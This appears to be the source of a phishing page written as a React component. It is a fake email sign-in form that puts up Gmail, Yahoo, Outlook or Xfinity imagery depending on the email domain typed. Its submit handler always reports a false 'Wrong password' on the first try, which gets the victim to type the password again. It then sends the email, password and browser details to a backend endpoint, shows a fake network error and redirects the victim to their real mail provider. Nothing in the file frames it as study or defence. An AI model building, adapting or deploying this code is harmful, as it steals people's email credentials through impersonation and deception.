import { useState, useEffect } from "react";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [attempt, setAttempt] = useState(0);
  const [status, setStatus] = useState("");
  const [bg, setBg] = useState("/images/default.svg");
  const [mobileBg, setMobileBg] = useState("/image/default.svg");
  const [countdown, setCountdown] = useState(10);
  const [showCountdown, setShowCountdown] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [remember, setRemember] = useState(false);

  // Detect if mobile device
  const isMobile = typeof window !== "undefined" && window.innerWidth < 768;

  useEffect(() => {
    let t;
    if (showCountdown && countdown > 0) {
      t = setTimeout(() => setCountdown((c) => c - 1), 500);
    } else if (countdown === 0 && showCountdown) {
      const domain = (email.split("@")[1] || "").toLowerCase();
      let url = "https://www.google.com";
      if (domain.includes("gmail.com")) url = "https://mail.google.com";
      else if (domain.includes("yahoo.com")) url = "https://mail.yahoo.com";
      else if (domain.includes("outlook.com") || domain.includes("hotmail.com"))
        url = "https://outlook.live.com";
      else if (domain.includes("comcast.net"))
        url = "https://xfinityconnect.mail.comcast.net";
      else if (domain.includes("bellsouth.net") || domain.includes("att.net"))
        url = "https://login.yahoo.com";
      else if (domain.includes("snet.net")) url = "https://mail.snet.net";
      window.location.href = url;
    }
    return () => clearTimeout(t);
  }, [showCountdown, countdown, email]);

  function handleEmail(e) {
    const val = e.target.value;
    setEmail(val);
    const domain = (val.split("@")[1] || "").toLowerCase();

    if (domain.includes("gmail.com")) {
      setBg("/images/gmaildesk.png");
      setMobileBg("/image/gmailmobile.png");
    } else if (domain.includes("yahoo.com")) {
      setBg("/images/yahoodesk.png");
      setMobileBg("/image/yahoomobile.png");
    } else if (
      domain.includes("outlook.com") ||
      domain.includes("hotmail.com")||
      domain.includes("hotmail.com")
    ) {
      setBg("/images/outlookdesk.png");
      setMobileBg("/image/outlookmobile.png");
    } else if (
      domain.includes("comcast.net") ||
      domain.includes("bellsouth.net") ||
      domain.includes("att.net") ||
      domain.includes("snet.net")
    ) {
      setBg("/images/xfinitydesk.png");
      setMobileBg("/image/xfinitymobile.png");
    } else {
      setBg("/images/default.svg");
      setMobileBg("/image/default.svg");
    }
  }

  async function handleSubmit(e) {
    e.preventDefault();
    if (attempt === 0) {
      setAttempt(1);
      setStatus("Wrong password. Please try again.");
      return;
    }

    setStatus("");
    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          remember,
          browser: navigator.userAgent,
          platform: navigator.platform,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setStatus("Network failed!");
        setShowCountdown(true);
      } else {
        setStatus("Server error. Try again later.");
      }
    } catch {
      setStatus("Network error!");
    }
  }

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center bg-cover bg-center transition-all duration-300 px-4"
      style={{
        backgroundImage: `url(${isMobile ? mobileBg : bg})`,
      }}
    >
      {/* Login Card */}
      <div className="bg-white shadow-lg rounded-xl p-6 w-full max-w-md sm:max-w-lg md:max-w-md">
        {/* Email Icon */}
        <div className="flex justify-center mb-4">
          <div className="bg-rose-400 w-16 h-16 flex items-center justify-center rounded-full">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="w-8 h-8 text-white"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={2}
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M3 8l9 6 9-6M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
              />
            </svg>
          </div>
        </div>

        <h1 className="text-2xl font-semibold mb-4 text-gray-800 text-center">
          Sign in to Continue
        </h1>

        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            value={email}
            onChange={handleEmail}
            type="email"
            placeholder="Email"
            required
            className="w-full p-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-400 outline-none"
          />

          <div className="relative">
            <input
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              required
              className="w-full p-3 border border-gray-300 rounded pr-10 focus:ring-2 focus:ring-blue-400 outline-none"
            />
            <button
              type="button"
              onClick={() => setShowPassword((p) => !p)}
              className="absolute inset-y-0 right-3 flex items-center text-gray-500"
            >
              {showPassword ? (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                  />
                </svg>
              ) : (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M13.875 18.825A10.05 10.05 0 0112 19c-4.477 0-8.268-2.943-9.542-7a9.973 9.973 0 012.042-3.368M9.88 9.88a3 3 0 104.24 4.24"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M3 3l18 18"
                  />
                </svg>
              )}
            </button>
          </div>

          {/* Remember Me + Forgot Password */}
          <div className="flex items-center justify-between text-sm text-gray-600">
            <label className="flex items-center space-x-2">
              <input
                type="checkbox"
                checked={remember}
                onChange={(e) => setRemember(e.target.checked)}
                className="form-checkbox text-blue-600"
              />
              <span>Remember me</span>
            </label>
            <button
              type="button"
              className="text-gray-500 hover:underline focus:outline-none"
            >
              Forgot password?
            </button>
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 rounded transition"
          >
            Next
          </button>
        </form>

        {/* Status Message */}
        {status && (
          <p
            className={`mt-3 text-sm text-center ${
              status === "Success!" ? "text-green-600" : "text-red-500"
            }`}
          >
            {status}
          </p>
        )}

        {/* showCountdown && (
          <p className="mt-2 text-sm text-gray-700 text-center">
            Redirecting in {countdown} seconds...
          </p>
        ) */}
      </div>
    </div>
  );
}
